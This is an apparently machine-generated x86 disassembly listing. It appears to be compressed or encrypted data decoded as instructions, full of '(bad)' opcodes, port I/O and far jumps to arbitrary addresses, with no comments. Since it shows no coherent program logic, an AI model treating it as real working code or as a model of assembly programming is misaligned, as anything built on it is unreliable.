  42641f:	mov    ebp,0xa4952204
  426424:	cmp    eax,0x240b157e
  426429:	pop    eax
  42642a:	popf   
  42642b:	js     0x426439
  42642d:	pop    es
  42642e:	push   esi
  42642f:	fnsave [edx-0x363530b0]
  426435:	(bad)  
  426436:	mov    esp,0xe153baeb
  42643b:	mov    ds:0x16e25008,eax
  426440:	jnp    0x4263ee
  426442:	xor    ebp,ecx
  426444:	fwait
  426445:	ds aaa 
  426447:	inc    edx
  426448:	repnz xchg ecx,eax
  42644a:	push   cs
  42644b:	out    0x9c,al
  42644d:	call   0x31737185
  426452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426453:	push   eax
  426454:	in     al,0xaf
  426456:	fidivr WORD PTR ds:0xcc2ea07a
  42645c:	imul   ecx,edi,0x5061e308
  426462:	sub    edi,esi
  426464:	pop    esp
  426465:	fcmovnb st,st(6)
  426467:	je     0x4263f5
  426469:	ins    BYTE PTR es:[edi],dx
  42646a:	dec    edi
  42646b:	inc    ecx
  42646c:	test   esp,ecx
  42646e:	arpl   WORD PTR [ecx-0x6e],sp
  426471:	ror    DWORD PTR [esi+0x69099622],cl
  426477:	add    ebp,edi
  426479:	stos   BYTE PTR es:[edi],al
  42647a:	out    dx,eax
  42647b:	mov    ebx,0x28cb941f
  426480:	push   DWORD PTR [ecx+0x36]
  426483:	xchg   DWORD PTR [ebp+0xe],eax
  426486:	mov    bh,0x73
  426488:	dec    esi
  426489:	mov    ebx,0x5c962122
  42648e:	xchg   ebp,eax
  42648f:	retf   
	...
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx-0x1dc0a07b]
  426503:	jl     0x4264f1
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	int    0x82
  42650e:	pop    ds
  42650f:	ins    DWORD PTR es:[edi],dx
  426510:	and    al,0xd1
  426512:	icebp  
  426513:	jl     0x4264a1
  426515:	ret    
  426516:	std    
  426517:	pop    ecx
  426518:	daa    
  426519:	test   BYTE PTR [eax-0x32e9f6d],dh
  42651f:	fisttp WORD PTR [eax*8-0x72fad3ea]
  426526:	loopne 0x4264c1
  426528:	cmp    esp,ebp
  42652a:	mov    bl,0xb
  42652c:	xor    BYTE PTR [ecx+0x13289966],cl
  426532:	xchg   ecx,eax
  426533:	fdiv   QWORD PTR [edi-0xd9ef3a6]
  426539:	and    BYTE PTR [eax-0x49649eb1],0x2b
  426540:	(bad)  
  426541:	imul   ecx,DWORD PTR [esp+esi*1-0x322ad0b7],0x21431012
  42654c:	pop    DWORD PTR [edi]
  42654e:	out    0x98,al
  426550:	dec    edi
  426551:	inc    ebp
  426552:	adc    DWORD PTR [edx+0x4a1e7f6e],edx
  426558:	nop
  426559:	in     eax,0xf0
  42655b:	js     0x4265a0
  42655d:	pop    ebp
  42655e:	lea    ebx,[edx+0x7bf14558]
  426564:	inc    ebx
  426565:	leave  
  426566:	leave  
  426567:	addr16 cli 
  426569:	cmp    DWORD PTR [eax],eax
  42656b:	in     eax,0x87
  42656d:	and    al,0xb2
  42656f:	push   ds
  426570:	mov    eax,ds:0xbca8a9c7
  426575:	inc    ecx
  426576:	imul   ebp,DWORD PTR [edi-0x4c326f86],0xb6c9a6ac
  426580:	ja     0x42658f
  426582:	loop   0x426518
  426584:	ror    dh,cl
  426586:	sbb    al,0x6d
  426588:	and    DWORD PTR [bp-0x5],0xffffffd1
  42658d:	jbe    0x4265f6
  42658f:	arpl   WORD PTR [ebx+0x5e11c382],bp
  426595:	or     eax,0xa333805e
  42659a:	cmp    eax,0x1cf34b4c
  42659f:	aam    0x3b
  4265a1:	mov    BYTE PTR [edx+0x63],al
  4265a4:	and    al,BYTE PTR [ebx-0x2a]
  4265a7:	sbb    al,0xfc
  4265a9:	out    dx,al
  4265aa:	out    dx,eax
  4265ab:	ins    BYTE PTR es:[edi],dx
  4265ac:	stc    
  4265ad:	out    0xc,al
  4265af:	fdivr  DWORD PTR [ecx+0x3d]
  4265b2:	ret    0x4d8e
  4265b5:	jge    0x426558
  4265b7:	adc    BYTE PTR [ebp-0x4aebf98],dl
  4265bd:	(bad)  
  4265be:	nop
  4265bf:	xchg   esi,eax
  4265c0:	jle    0x42661e
  4265c2:	jno    0x42657a
  4265c4:	push   esi
  4265c5:	push   ebp
  4265c6:	mov    ds:0xd6b7a8f1,eax
  4265cb:	(bad)  
  4265cd:	repz jne 0x426564
  4265d0:	fstp   TBYTE PTR ds:0x6314bfaf
  4265d6:	out    dx,eax
  4265d7:	sub    cl,BYTE PTR ds:0x37ac9e59
  4265dd:	xchg   BYTE PTR [edx+ebp*1+0x8fb16f5],ch
  4265e4:	push   0x318de2af
  4265e9:	int3   
  4265ea:	bound  esi,QWORD PTR [ecx+0x3488c15]
  4265f0:	xor    edi,edx
  4265f2:	xlat   BYTE PTR ds:[ebx]
  4265f3:	ss es mov al,0xf3
  4265f7:	inc    esi
  4265f8:	ficom  WORD PTR [ebx+0xd]
  4265fb:	add    BYTE PTR [edx+esi*8],ah
  4265fe:	fistp  DWORD PTR ds:0x6585edec
  426604:	ret    
  426605:	mov    cl,dl
  426607:	lods   eax,DWORD PTR ds:[esi]
  426608:	xchg   ebx,eax
  426609:	push   ebx
  42660a:	jp     0x426594
  42660c:	add    dh,cl
  42660e:	in     eax,dx
  42660f:	mov    DWORD PTR [eax],0x0
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi-0x619e925c]
  426682:	mov    edx,0x199f049
  426687:	add    BYTE PTR [ecx+eax*1],al
  42668a:	add    BYTE PTR [eax],al
  42668c:	daa    
  42668d:	inc    ebx
  42668e:	xor    eax,0xa40b4cf5
  426693:	addr16 inc esi
  426695:	or     cl,dl
  426697:	and    edx,DWORD PTR [edi+0x23]
  42669a:	out    dx,al
  42669b:	ins    DWORD PTR es:[edi],dx
  42669c:	xchg   DWORD PTR [edi],esp
  42669e:	mov    dl,0x60
  4266a0:	and    al,0xbd
  4266a2:	inc    eax
  4266a3:	in     eax,dx
  4266a4:	and    DWORD PTR [ecx+0x71],ecx
  4266a7:	push   edx
  4266a8:	push   edi
  4266a9:	ror    al,cl
  4266ab:	sti    
  4266ac:	out    dx,al
  4266ad:	xchg   ecx,eax
  4266ae:	sbb    edx,esp
  4266b0:	in     al,dx
  4266b1:	clc    
  4266b2:	jnp    0x426645
  4266b4:	in     al,0xd6
  4266b6:	jl     0x4266c4
  4266b8:	dec    eax
  4266b9:	xor    al,0x86
  4266bb:	sub    eax,0xf0b6176b
  4266c0:	mov    ebp,0xde151f43
  4266c5:	dec    edx
  4266c6:	push   es
  4266c7:	test   BYTE PTR [esi-0x42480b08],dh
  4266cd:	cldemote BYTE PTR [esi]
  4266d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266d1:	cmc    
  4266d2:	cwde   
  4266d3:	(bad)  
  4266d4:	das    
  4266d5:	daa    
  4266d6:	cli    
  4266d7:	out    0xaa,al
  4266d9:	es call 0xebad:0x393dd5a5
  4266e1:	test   esi,ebx
  4266e3:	pop    eax
  4266e4:	and    al,0x82
  4266e7:	or     al,0xa9
  4266e9:	and    ah,BYTE PTR [ecx-0x13e59c94]
  4266ef:	and    dl,0x2d
  4266f2:	xchg   ecx,eax
  4266f3:	cmp    al,0xa
  4266f5:	cdq    
  4266f6:	xchg   edi,eax
  4266f7:	or     al,0x56
  4266f9:	sub    eax,0x4422f642
  4266fe:	shr    DWORD PTR [ecx],1
  426700:	pusha  
  426701:	mov    edx,0x66effc09
  426706:	push   0xccd11dae
  42670b:	(bad)  
  42670c:	jns    0x426708
  42670e:	cmc    
  42670f:	stos   DWORD PTR es:[edi],eax
  426710:	cmp    esi,ecx
  426712:	adc    eax,DWORD PTR [eax]
  426714:	jmp    0x4266ff
  426716:	sub    dl,BYTE PTR [edx+0x34]
  426719:	jl     0x426707
  42671b:	xor    eax,0xfcab44ba
  426720:	mov    dh,0xe8
  426722:	scas   eax,DWORD PTR es:[edi]
  426723:	call   0x16182893
  426728:	lea    eax,[edi-0x2d]
  42672b:	cmp    al,BYTE PTR [ecx]
  42672d:	or     ebp,DWORD PTR [ebx-0x1def6896]
  426733:	xor    esi,DWORD PTR [edx+0x2e974abb]
  426739:	or     bh,BYTE PTR [ebp*2+0x260041fa]
  426740:	lock imul esp,DWORD PTR [edx+0x25f05655],0x7624fa26
  42674b:	mov    ebp,0x8ca04642
  426750:	jg     0x42679e
  426752:	push   ds
  426753:	std    
  426754:	push   ebp
  426755:	adc    ebp,DWORD PTR [ebx+0x1137b6c]
  42675b:	enter  0x4fe5,0x86
  42675f:	das    
  426760:	mov    edi,ss
  426762:	inc    esp
  426763:	push   ss
  426764:	add    BYTE PTR [ebp-0x18f1192f],bl
  42676a:	xchg   ebp,eax
  42676b:	dec    esp
  42676c:	lahf   
  42676d:	test   DWORD PTR [edx-0x6d71da23],0xd9f62ea3
  426777:	push   fs
  426779:	ret    0xf0da
  42677c:	inc    ebp
  42677d:	or     esp,DWORD PTR [edx+0x285b3536]
  426783:	repnz into 
  426785:	mov    esi,0x3313d108
  42678a:	add    bh,ch
  42678c:	gs dec eax
  42678e:	fld    DWORD PTR ds:0x0
	...
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	xchg   ebx,eax
  426801:	(bad)  
  426803:	push   ss
  426804:	hlt    
  426805:	call   0x0:0x1040001
  42680c:	push   0xffffffd2
  42680e:	aaa    
  42680f:	xor    esi,DWORD PTR [ebx]
  426811:	mov    edi,0xf4ca6620
  426816:	and    DWORD PTR [edx-0x15],eax
  426819:	mov    al,ds:0xcdc83fd1
  42681e:	mov    dh,0x70
  426820:	mov    ebx,0xa9b82791
  426825:	or     DWORD PTR [ebx+0x14],esi
  426828:	and    dl,BYTE PTR [edx]
  42682a:	call   0x2c7a:0x97dda6d1
  426831:	das    
  426832:	push   dx
  426834:	pop    ds
  426835:	out    dx,al
  426836:	mov    al,0x4b
  426838:	adc    DWORD PTR [ecx-0x2810da53],0x2a
  42683f:	lds    esi,FWORD PTR [ebx+ebp*8]
  426842:	jo     0x426816
  426844:	jbe    0x4267eb
  426846:	push   ecx
  426847:	pop    edx
  426848:	lds    ecx,FWORD PTR [esp+edx*2+0x66505d1f]
  42684f:	mov    ebp,0x83b11fa9
  426854:	xor    dh,bh
  426856:	sbb    DWORD PTR [ebx],0xf64f0ace
  42685c:	cmp    al,0x41
  42685e:	inc    edi
  42685f:	mov    esp,0xa1890f6c
  426864:	scas   eax,DWORD PTR es:[edi]
  426865:	or     eax,0x9fbc169a
  42686a:	mov    ah,0xdd
  42686c:	inc    esp
  42686d:	(bad)  
  42686e:	es mov ah,0x3
  426871:	pop    ss
  426872:	or     esi,DWORD PTR [esi+0x4e690546]
  426878:	jae    0x426880
  42687a:	std    
  42687b:	scas   eax,DWORD PTR es:[edi]
  42687c:	call   0x151:0x61f1bfd2
  426883:	mov    esi,0x2cb34892
  426888:	sub    al,0x80
  42688a:	mov    bl,0xda
  42688c:	mov    dh,0xd0
  42688e:	pushf  
  42688f:	mov    edx,DWORD PTR ds:0xaab46493
  426895:	in     al,0x2c
  426897:	lock add DWORD PTR [eax+0x4bc5e5a1],edx
  42689e:	shl    cl,0x33
  4268a1:	ja     0x4268c8
  4268a3:	lock mov eax,ds:0x186d7206
  4268a9:	xor    cl,BYTE PTR [eax]
  4268ab:	add    cl,ah
  4268ad:	push   0xffffffc8
  4268af:	nop
  4268b0:	rcl    BYTE PTR [ebp+0x2e80122a],0x92
  4268b7:	push   es
  4268b8:	xchg   ecx,eax
  4268b9:	outs   dx,DWORD PTR ds:[esi]
  4268ba:	adc    al,0xa2
  4268bc:	shr    DWORD PTR [esi-0x25],0xed
  4268c0:	jmp    0xcf13:0x9bbbfffb
  4268c7:	push   ebp
  4268c8:	xor    eax,0x2c4e8ca2
  4268cd:	push   cs
  4268ce:	pop    esi
  4268cf:	bound  ebp,QWORD PTR [ecx]
  4268d1:	(bad)  
  4268d3:	in     eax,0xc0
  4268d5:	jbe    0x426883
  4268d7:	xor    dl,BYTE PTR [edi-0x49]
  4268da:	jg     0x42692a
  4268dc:	(bad)  
  4268de:	mov    BYTE PTR [eax],ah
  4268e0:	popf   
  4268e1:	inc    edx
  4268e2:	lock sub al,0x3d
  4268e5:	jbe    0x42691b
  4268e7:	mov    ch,0xd1
  4268e9:	jns    0x4268f7
  4268eb:	adc    DWORD PTR [eax-0x2303a8de],esi
  4268f1:	sbb    ch,dl
  4268f3:	sub    ecx,DWORD PTR [ebx-0x5a]
  4268f6:	outs   dx,BYTE PTR ds:[esi]
  4268f7:	cmc    
  4268f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268f9:	jge    0x426883
  4268fb:	pop    esp
  4268fc:	inc    ebx
  4268fd:	mov    esp,0x5d5ced32
  426902:	out    0xd5,al
  426904:	loope  0x42689a
  426906:	data16 xchg BYTE PTR [ecx+0x478682eb],cl
  42690d:	push   ebx
  42690e:	in     eax,0xba
	...
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    ecx,DWORD PTR [ebx-0x5e]
  426982:	push   0x54
  426984:	clc    
  426985:	fwait
  426986:	add    DWORD PTR [eax],eax
  426988:	add    al,0x1
  42698a:	add    BYTE PTR [eax],al
  42698c:	popa   
  42698d:	popa   
  42698e:	mov    al,ds:0xe250de29
  426993:	mov    ds:0xe1d79619,eax
  426998:	test   dh,ch
  42699a:	xchg   edi,eax
  42699b:	daa    
  42699c:	xor    eax,DWORD PTR [edi+edx*1+0x66]
  4269a0:	xchg   DWORD PTR [ebp-0x4ec577a7],edi
  4269a6:	xor    BYTE PTR [esp+eiz*2-0x43],0xf4
  4269ab:	mov    BYTE PTR [esp+ebp*4+0x21],al
  4269af:	daa    
  4269b0:	sub    edx,DWORD PTR [ebp+0x642cd7f8]
  4269b6:	pop    esi
  4269b7:	or     DWORD PTR [ebp-0xe],esi
  4269ba:	inc    ebx
  4269bb:	mov    es:0xcd7b581a,al
  4269c1:	xor    DWORD PTR [ebx+0xc],edi
  4269c4:	push   eax
  4269c5:	and    DWORD PTR [eax],ebx
  4269c7:	and    eax,0xbbac481c
  4269cc:	push   eax
  4269cd:	outs   dx,BYTE PTR ds:[esi]
  4269ce:	clc    
  4269cf:	mov    ds:0x588e0d9e,eax
  4269d4:	stos   BYTE PTR es:[edi],al
  4269d5:	stos   BYTE PTR es:[edi],al
  4269d6:	aas    
  4269d7:	mov    eax,ds:0x87ae5c79
  4269dc:	daa    
  4269dd:	aaa    
  4269de:	fstp   QWORD PTR [edi-0x39]
  4269e1:	mov    eax,0x3c8c1b75
  4269e6:	(bad)  
  4269e7:	jb     0x426a23
  4269e9:	mov    ebp,0x4f6fed0
  4269ee:	push   ecx
  4269ef:	and    al,0xfd
  4269f1:	pop    ecx
  4269f2:	stos   BYTE PTR es:[edi],al
  4269f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269f4:	or     DWORD PTR [ebp-0x5f],0x38
  4269f8:	fst    QWORD PTR [esi-0x7b5b0cc5]
  4269fe:	add    dl,dl
  426a00:	div    BYTE PTR [ecx]
  426a02:	gs mov ch,0x69
  426a05:	repz adc al,0x90
  426a08:	add    bl,BYTE PTR [ecx]
  426a0a:	enter  0x170d,0x68
  426a0e:	push   ebp
  426a0f:	mov    bl,0x7e
  426a11:	popa   
  426a12:	add    al,0xcf
  426a14:	cmp    ch,dl
  426a16:	push   esp
  426a17:	repnz scas eax,DWORD PTR es:[edi]
  426a19:	pushf  
  426a1a:	(bad)  
  426a1b:	xor    al,0x25
  426a1d:	js     0x4269fa
  426a1f:	loop   0x426a94
  426a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a22:	aad    0x83
  426a24:	iret   
  426a25:	dec    ebx
  426a26:	cmp    DWORD PTR [ebp-0x36c933ec],ebp
  426a2c:	ror    DWORD PTR [ebx+0x470848b9],0x11
  426a33:	js     0x4269f6
  426a35:	jns    0x426a3e
  426a37:	out    dx,eax
  426a38:	fst    QWORD PTR [ebx-0x5f8cf1d1]
  426a3e:	push   0xfffffff9
  426a40:	or     bl,BYTE PTR [edi+0x6a38311]
  426a46:	hlt    
  426a47:	mov    BYTE PTR [edi+ebp*1-0x4],dl
  426a4b:	test   BYTE PTR [eax+edi*1+0x6d748999],0x49
  426a53:	push   ebx
  426a54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a55:	je     0x426a34
  426a57:	xor    dl,BYTE PTR [ecx-0x7ca6195c]
  426a5d:	sti    
  426a5e:	push   esi
  426a5f:	gs dec ebp
  426a61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a62:	inc    esp
  426a63:	dec    edx
  426a64:	cmp    DWORD PTR [edi+0x2d],ebp
  426a67:	pop    ebp
  426a68:	inc    esi
  426a69:	cs xchg edi,eax
  426a6b:	outs   dx,DWORD PTR ds:[esi]
  426a6c:	adc    bl,dh
  426a6e:	jmp    0x35bd:0x1afbfcf8
  426a75:	xor    esp,DWORD PTR [edx]
  426a77:	cwde   
  426a78:	cs push 0x3e
  426a7b:	scas   al,BYTE PTR es:[edi]
  426a7c:	dec    esi
  426a7d:	add    eax,0x9e5d8ef6
  426a82:	and    bh,dl
  426a84:	mov    bh,0xa6
  426a86:	ja     0x426a4e
  426a88:	push   ebx
  426a89:	mov    ah,0x14
  426a8b:	xlat   BYTE PTR ds:[ebx]
  426a8c:	fwait
  426a8d:	jne    0x426ab4
  426a8f:	retf   0x0
	...
  426af2:	add    BYTE PTR [eax],al
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x2f
  426b01:	cmp    BYTE PTR [ebx+0x19cfc49],bh
  426b07:	add    BYTE PTR [ecx+eax*1],al
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	fisub  WORD PTR [edi+0x20]
  426b0f:	scas   eax,DWORD PTR es:[edi]
  426b10:	mov    DWORD PTR [eax+0x2c],esi
  426b13:	add    ch,BYTE PTR [edi]
  426b15:	sub    edi,DWORD PTR [ebx]
  426b17:	hlt    
  426b18:	cmc    
  426b19:	add    al,0xb3
  426b1b:	dec    ebx
  426b1c:	cmp    bh,al
  426b1e:	adc    DWORD PTR [edi],eax
  426b20:	stos   DWORD PTR es:[edi],eax
  426b21:	pop    ebx
  426b22:	fst    DWORD PTR [eax-0x6c79e591]
  426b28:	rcr    BYTE PTR [edi+0x22a32244],cl
  426b2e:	shr    BYTE PTR [bx+di+0x6ee8],0x81
  426b34:	ins    DWORD PTR es:[edi],dx
  426b35:	mov    dl,BYTE PTR es:[ecx+0x32]
  426b39:	test   DWORD PTR [eax],eax
  426b3b:	add    eax,0x9be9199e
  426b40:	lods   al,BYTE PTR ds:[esi]
  426b41:	out    0x2a,al
  426b43:	mov    DWORD PTR ds:[eax+edi*2+0x1b],0xa7543b23
  426b4c:	call   0x2eaade99
  426b51:	push   esp
  426b52:	in     eax,0x30
  426b54:	adc    BYTE PTR [edi+0x663da5b9],bl
  426b5a:	shl    ah,0x75
  426b5d:	mov    ?,WORD PTR ds:0x769fbb16
  426b63:	xor    bh,BYTE PTR [edx]
  426b65:	vmptrld QWORD PTR [esp+edi*8+0x48]
  426b6a:	or     ebx,DWORD PTR [edx]
  426b6c:	mov    cl,0xae
  426b6e:	cmp    BYTE PTR [ebx],bh
  426b70:	pop    eax
  426b71:	fstp   QWORD PTR [edx-0x6cbd7a33]
  426b77:	mov    ebx,edx
  426b79:	xchg   ebx,eax
  426b7a:	pusha  
  426b7b:	jnp    0x426b6d
  426b7d:	(bad)  
  426b7e:	jmp    0x8845:0x1f040db6
  426b85:	xchg   edx,eax
  426b86:	cmp    BYTE PTR ds:0x3e9a94f6,bl
  426b8c:	xchg   esp,eax
  426b8d:	addr16 cli 
  426b8f:	and    ebp,esi
  426b91:	test   BYTE PTR [ecx-0x2ec5ed89],bh
  426b97:	js     0x426b80
  426b99:	sub    cl,BYTE PTR fs:0x3e326efa
  426ba0:	xlat   BYTE PTR ds:[ebx]
  426ba1:	cmc    
  426ba2:	(bad)  
  426ba3:	scas   eax,DWORD PTR es:[edi]
  426ba4:	je     0x426be8
  426ba6:	stos   DWORD PTR es:[edi],eax
  426ba7:	retf   0x6065
  426baa:	jle    0x426b65
  426bac:	inc    ecx
  426bad:	lods   al,BYTE PTR ds:[esi]
  426bae:	dec    ecx
  426baf:	and    al,0xc
  426bb1:	ja     0x426c09
  426bb3:	ret    0x7aa5
  426bb6:	ret    
  426bb7:	adc    eax,0x76687965
  426bbc:	iret   
  426bbd:	out    0xf0,al
  426bbf:	sub    BYTE PTR [esi+0x66],0xf3
  426bc3:	and    DWORD PTR [ebp+0x65],ebx
  426bc6:	push   0x37
  426bc8:	in     al,dx
  426bc9:	jmp    0x8eb9c25f
  426bce:	push   edx
  426bcf:	rcl    esp,cl
  426bd1:	or     BYTE PTR [edx-0x145c48d9],ah
  426bd7:	sti    
  426bd8:	pop    ecx
  426bd9:	adc    eax,0xb52c824
  426bde:	ret    0xfb35
  426be1:	mov    ds:0x2098ddda,al
  426be6:	mov    edx,0x7f120b43
  426beb:	add    bh,BYTE PTR [ebp+0x63089b3a]
  426bf1:	arpl   WORD PTR [eax-0x5e61b421],bp
  426bf7:	in     eax,0x7
  426bf9:	setne  BYTE PTR [ebp-0x4d93dd5e]
  426c00:	xchg   esp,eax
  426c01:	xchg   edx,eax
  426c02:	into   
  426c03:	test   al,0x5b
  426c05:	cs addr16 pop esp
  426c08:	enter  0xc638,0xf
  426c0c:	xchg   edi,eax
  426c0d:	mov    bl,0x53
	...
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xd6adf5a3
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	sahf   
  426c8d:	push   ds
  426c8e:	mov    cl,0x1c
  426c90:	sbb    ebx,edx
  426c92:	leave  
  426c93:	cmp    al,0x3f
  426c95:	sbb    bh,BYTE PTR [eax+0x6a185ecc]
  426c9b:	push   dx
  426c9d:	jle    0x426c3c
  426c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ca0:	stos   BYTE PTR es:[edi],al
  426ca1:	ins    DWORD PTR es:[edi],dx
  426ca2:	sub    eax,0xb40db55a
  426ca7:	dec    edx
  426ca8:	dec    edx
  426ca9:	in     al,dx
  426caa:	fldcw  WORD PTR [eax+ebp*8+0x776c710]
  426cb1:	cmc    
  426cb2:	js     0x426c96
  426cb4:	jnp    0x426c63
  426cb6:	in     eax,dx
  426cb7:	pop    ecx
  426cb8:	popf   
  426cb9:	jb     0x426c56
  426cbb:	pop    es
  426cbc:	mov    ds:0x9447d6a0,al
  426cc1:	test   eax,0x76bd7677
  426cc6:	jmp    0x426c52
  426cc8:	lahf   
  426cc9:	mov    BYTE PTR [esi],ah
  426ccb:	das    
  426ccc:	dec    edi
  426ccd:	mov    ebx,ebx
  426ccf:	outs   dx,BYTE PTR ds:[esi]
  426cd0:	(bad)  
  426cd1:	(bad)  
  426cd3:	push   ecx
  426cd4:	in     eax,0x90
  426cd6:	pop    es
  426cd7:	clc    
  426cd8:	sbb    ebp,DWORD PTR [esi+0x4cee082c]
  426cde:	adc    bh,0xc0
  426ce1:	dec    ecx
  426ce2:	pop    ds
  426ce3:	adc    esp,0xd8b6775d
  426ce9:	cs mov ch,0xe6
  426cec:	nop
  426ced:	or     eax,0xbeeb1b7c
  426cf2:	push   0xffffffa1
  426cf4:	jp     0x426ccb
  426cf6:	add    al,0xfd
  426cf8:	lods   al,BYTE PTR ds:[esi]
  426cf9:	jbe    0x426cc7
  426cfb:	add    al,0x11
  426cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cfe:	xlat   BYTE PTR ds:[ebx]
  426cff:	xchg   bl,al
  426d01:	add    DWORD PTR [edi],esp
  426d03:	(bad)  
  426d04:	ret    0x808a
  426d07:	aas    
  426d08:	inc    ebp
  426d09:	ret    
  426d0a:	not    DWORD PTR [eax-0x67]
  426d0d:	aam    0xad
  426d0f:	fdivr  DWORD PTR [eax-0x4ecf371c]
  426d15:	or     ch,BYTE PTR [ecx]
  426d17:	in     eax,dx
  426d18:	inc    edi
  426d19:	mov    ecx,ss
  426d1b:	fwait
  426d1c:	mov    bl,0xb8
  426d1e:	and    al,0x9
  426d20:	mov    esi,0xcaab7b3a
  426d25:	retf   0x7349
  426d28:	test   BYTE PTR [edi],ch
  426d2a:	adc    bl,0x55
  426d2d:	fdivr  QWORD PTR [ebx]
  426d2f:	fnstsw WORD PTR [ecx-0x54]
  426d32:	popa   
  426d33:	adc    eax,0x78a1821c
  426d38:	sbb    eax,eax
  426d3a:	xchg   edi,eax
  426d3b:	sub    BYTE PTR [ebx-0xdb3127a],dl
  426d41:	mov    edx,0x6ffe0624
  426d46:	sti    
  426d47:	iret   
  426d48:	pusha  
  426d49:	jae    0x426d11
  426d4b:	inc    esi
  426d4c:	push   ecx
  426d4d:	adc    al,0x63
  426d4f:	pop    esi
  426d50:	lahf   
  426d51:	and    ebx,DWORD PTR [edi+edi*4]
  426d54:	or     eax,0x99b6069c
  426d59:	jmp    0xc37985e8
  426d5e:	xchg   esp,eax
  426d5f:	cmp    ah,BYTE PTR [ecx+ebp*8+0x9]
  426d63:	dec    edx
  426d64:	gs push ebp
  426d66:	ss ins BYTE PTR es:[edi],dx
  426d68:	jmp    0x8af73d8f
  426d6d:	cmp    al,ch
  426d6f:	pop    ebx
  426d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d71:	sub    ebx,edx
  426d73:	loope  0x426d0a
  426d75:	cmp    edi,DWORD PTR [eax+0x1a82f7b0]
  426d7b:	jns    0x426dd0
  426d7d:	popf   
  426d7e:	inc    ebx
  426d7f:	scas   eax,DWORD PTR es:[edi]
  426d80:	cmp    DWORD PTR [eax-0x1db46d0e],0x260c48a
  426d8a:	adc    al,0x21
  426d8c:	loope  0x426d52
  426d8e:	out    dx,al
  426d8f:	or     DWORD PTR [eax],eax
	...
  426df1:	add    BYTE PTR [eax],al
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0xed0c:0xc7c2ecf9
  426e01:	sub    eax,0x9f047491
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    al,0x1
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	pop    eax
  426e0d:	and    ebx,DWORD PTR [ebp+0x443aeff4]
  426e13:	push   cs
  426e14:	ss jecxz 0x426e91
  426e17:	cmp    BYTE PTR [esi],0x97
  426e1a:	fisttp DWORD PTR [ecx+eax*8]
  426e1d:	aaa    
  426e1e:	or     eax,0x31e281c7
  426e23:	push   edi
  426e24:	and    al,0xd4
  426e26:	imul   ebx,esi,0xce5adbe5
  426e2c:	mov    dl,BYTE PTR [ecx-0x17]
  426e2f:	or     DWORD PTR [esi-0x35],eax
  426e32:	inc    eax
  426e33:	test   al,0x4b
  426e35:	xor    BYTE PTR [ebp+0x7ccab8a3],dh
  426e3b:	or     esp,edi
  426e3d:	cwde   
  426e3e:	fcmovb st,st(7)
  426e40:	jae    0x426e41
  426e42:	jae    0x426ea8
  426e44:	daa    
  426e45:	cdq    
  426e46:	jnp    0x426e2f
  426e48:	ret    0xeae5
  426e4b:	test   BYTE PTR [ebx+edi*2],0x70
  426e4f:	inc    ebp
  426e50:	mov    eax,0xb69baeb3
  426e55:	dec    esi
  426e56:	xchg   ebp,eax
  426e57:	aad    0xa4
  426e59:	sub    esi,ebx
  426e5b:	xchg   ebp,eax
  426e5c:	jmp    0xb41e:0x6e4717e5
  426e63:	or     BYTE PTR [eax-0x3d0da28e],bl
  426e69:	ins    BYTE PTR es:[edi],dx
  426e6a:	out    0xa0,eax
  426e6c:	fucom  st(1)
  426e6e:	xor    DWORD PTR [edi-0x32cc9a63],ecx
  426e74:	loop   0x426e11
  426e76:	loopne 0x426e21
  426e78:	jl     0x426e3d
  426e7a:	cmp    eax,0xebd3b11f
  426e7f:	icebp  
  426e80:	push   ebx
  426e81:	fwait
  426e82:	sub    DWORD PTR [edx+0x6a7a19d4],0xffffffc4
  426e89:	push   es
  426e8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e8b:	fs inc esp
  426e8d:	aas    
  426e8e:	cmp    al,0x50
  426e90:	mov    bl,0x78
  426e92:	in     eax,0xca
  426e94:	mov    eax,ds:0x8373749a
  426e99:	shr    DWORD PTR [eax],1
  426e9b:	out    dx,eax
  426e9c:	cs mov ebp,0xed3432bd
  426ea2:	mov    al,0x70
  426ea4:	shl    BYTE PTR [ebx+0x47],1
  426ea7:	sub    BYTE PTR [ebx+0x2],cl
  426eaa:	add    eax,0xf3cb487f
  426eaf:	dec    ebx
  426eb0:	aad    0x54
  426eb2:	(bad)  
  426eb3:	fsubr  QWORD PTR [edi-0x6]
